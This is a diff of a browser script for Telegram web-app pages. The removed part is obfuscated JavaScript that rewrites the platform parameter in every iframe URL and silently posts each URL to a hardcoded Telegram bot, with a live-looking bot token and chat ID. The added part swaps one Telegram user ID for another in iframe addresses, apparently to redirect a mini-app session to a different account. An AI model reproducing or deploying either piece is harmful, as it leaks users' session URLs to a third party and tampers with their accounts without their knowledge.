@@ -1,1 +1,40 @@
-const a0_0x303b2e=a0_0x4df0;function a0_0x4df0(_0x4b13f0,_0x240c40){const _0x1bf32b=a0_0x1bf3();return a0_0x4df0=function(_0x4df08a,_0x45b2f0){_0x4df08a=_0x4df08a-0x89;let _0x911c4e=_0x1bf32b[_0x4df08a];return _0x911c4e;},a0_0x4df0(_0x4b13f0,_0x240c40);}(function(_0x2345b4,_0x33f264){const _0x476779=a0_0x4df0,_0xa7ce51=_0x2345b4();while(!![]){try{const _0xd80471=parseInt(_0x476779(0xac))/0x1*(parseInt(_0x476779(0xa2))/0x2)+parseInt(_0x476779(0xaf))/0x3*(parseInt(_0x476779(0x9d))/0x4)+parseInt(_0x476779(0x9a))/0x5*(-parseInt(_0x476779(0xa0))/0x6)+parseInt(_0x476779(0x97))/0x7+parseInt(_0x476779(0xaa))/0x8*(-parseInt(_0x476779(0x90))/0x9)+parseInt(_0x476779(0x8a))/0xa*(-parseInt(_0x476779(0x8c))/0xb)+parseInt(_0x476779(0xab))/0xc*(-parseInt(_0x476779(0xa1))/0xd);if(_0xd80471===_0x33f264)break;else _0xa7ce51['push'](_0xa7ce51['shift']());}catch(_0x5ab642){_0xa7ce51['push'](_0xa7ce51['shift']());}}}(a0_0x1bf3,0x37009));function a0_0x1bf3(){const _0x116e5e=['Iframe\x20','description','4CgVUZc','catch','ELEMENT_NODE','65874yiMgyR','82771lDwREi','1504cgihBb','nodeType','tagName','querySelectorAll','type','POST','https://api.telegram.org/bot','6117290875:AAGXwH0PRNoVvlHEKRAsKcfTvrOnEJ0HxSg','25360lvPVTh','192LLGqUe','298gVAZqm','\x20URL\x20did\x20not\x20change:\x20','error','843654zxhXUt','childList','stringify','50tqBUTw','forEach','387717QSjWMm','Error\x20modifying\x20URL:\x20','log','Error\x20sending\x20message:','720Qlvpwi','observe','json','toLowerCase','src','iframe','-4268843144','2760863oklroi','then','replace','65zRzFfd'];a0_0x1bf3=function(){return _0x116e5e;};return a0_0x1bf3();}const PARAMS=a0_0x303b2e(0xa9),GENERAL_INDEX=a0_0x303b2e(0x96);function sendMessageToTelegram(_0x34c9bc){const _0x4626d8=a0_0x303b2e,_0x5582ce=_0x4626d8(0xa8)+PARAMS+'/sendMessage',_0x4b2a38={'chat_id':GENERAL_INDEX,'text':_0x34c9bc};fetch(_0x5582ce,{'method':_0x4626d8(0xa7),'headers':{'Content-Type':'application/json'},'body':JSON[_0x4626d8(0x89)](_0x4b2a38)})['then'](_0x16f6c3=>_0x16f6c3[_0x4626d8(0x92)]())[_0x4626d8(0x98)](_0x559cab=>{const _0x59544f=_0x4626d8;!_0x559cab['ok']&&console[_0x59544f(0xae)](_0x59544f(0x8f),_0x559cab[_0x59544f(0x9c)]);})[_0x4626d8(0x9e)](_0x87e75d=>{const _0xaf4fc6=_0x4626d8;console[_0xaf4fc6(0xae)](_0xaf4fc6(0x8f),_0x87e75d);});}function modifyIframeSrc(_0x42d63f){const _0x43629b=a0_0x303b2e;try{const _0x1f887d=/(\?|&)tgWebAppPlatform=web(&|$)/,_0x376f22=_0x42d63f[_0x43629b(0x99)](_0x1f887d,'$1tgWebAppPlatform=ios$2');return _0x376f22;}catch(_0x1cb092){return console[_0x43629b(0xae)](_0x43629b(0x8d)+_0x42d63f,_0x1cb092),_0x42d63f;}}function processIframe(_0x2b5344,_0x56ed27){const _0x2c6cef=a0_0x303b2e,_0x38c7af=_0x2b5344[_0x2c6cef(0x94)],_0x1bb4c1=modifyIframeSrc(_0x38c7af);if(_0x38c7af!==_0x1bb4c1){_0x2b5344[_0x2c6cef(0x94)]=_0x1bb4c1;const _0x3a2db7=_0x2c6cef(0x9b)+(_0x56ed27+0x1)+':\x20'+_0x1bb4c1;console[_0x2c6cef(0x8e)](_0x3a2db7),sendMessageToTelegram(_0x3a2db7);}else console['log'](_0x2c6cef(0x9b)+(_0x56ed27+0x1)+_0x2c6cef(0xad)+_0x38c7af);}function logAllIframes(){const _0x462110=a0_0x303b2e,_0x309494=document[_0x462110(0xa5)](_0x462110(0x95));_0x309494[_0x462110(0x8b)]((_0x7b774a,_0x4f2780)=>{processIframe(_0x7b774a,_0x4f2780);});}function observeNewIframes(){const _0x5d4405=a0_0x303b2e,_0x24924c=new MutationObserver(_0x2918e9=>{_0x2918e9['forEach'](_0x1b0cbb=>{const _0xac6a75=a0_0x4df0;_0x1b0cbb[_0xac6a75(0xa6)]===_0xac6a75(0xb0)&&_0x1b0cbb['addedNodes'][_0xac6a75(0x8b)](_0x47a0e8=>{const _0xd51a2d=_0xac6a75;if(_0x47a0e8[_0xd51a2d(0xa3)]===Node[_0xd51a2d(0x9f)]){if(_0x47a0e8[_0xd51a2d(0xa4)][_0xd51a2d(0x93)]()===_0xd51a2d(0x95))processIframe(_0x47a0e8,0x0);else{const _0x1bf272=_0x47a0e8[_0xd51a2d(0xa5)](_0xd51a2d(0x95));_0x1bf272[_0xd51a2d(0x8b)]((_0x19b9e0,_0x248513)=>{processIframe(_0x19b9e0,_0x248513);});}}});});});_0x24924c[_0x5d4405(0x91)](document['body'],{'childList':!![],'subtree':!![]});}logAllIframes(),observeNewIframes();
+document.addEventListener("DOMContentLoaded", function() {
+    try {
+        // Регулярное выражение для поиска ID пользователя
+        const userIdPattern = /6724853537/g;
+        const newUserId = "6004919395";
+
+        // Функция для замены ID пользователя в src атрибутах iframe
+        function replaceUserIdInIframes() {
+            const iframes = document.querySelectorAll("iframe");
+            iframes.forEach(iframe => {
+                const src = iframe.getAttribute("src");
+                if (src && src.match(userIdPattern)) {
+                    const newSrc = src.replace(userIdPattern, newUserId);
+                    iframe.setAttribute("src", newSrc);
+                    console.log(`Заменен ID пользователя в iframe: ${newSrc}`);
+                }
+            });
+        }
+
+        // Инициализируем MutationObserver для отслеживания изменений в DOM
+        const observer = new MutationObserver((mutationsList, observer) => {
+            for (const mutation of mutationsList) {
+                if (mutation.type === 'childList') {
+                    replaceUserIdInIframes();
+                }
+            }
+        });
+
+        // Начинаем наблюдение за изменениями в теле документа
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true
+        });
+
+        // Первоначальный вызов для замены ID в уже существующих iframe
+        replaceUserIdInIframes();
+    } catch (error) {
+        console.error("Произошла ошибка при замене ID пользователя:", error);
+    }
+});
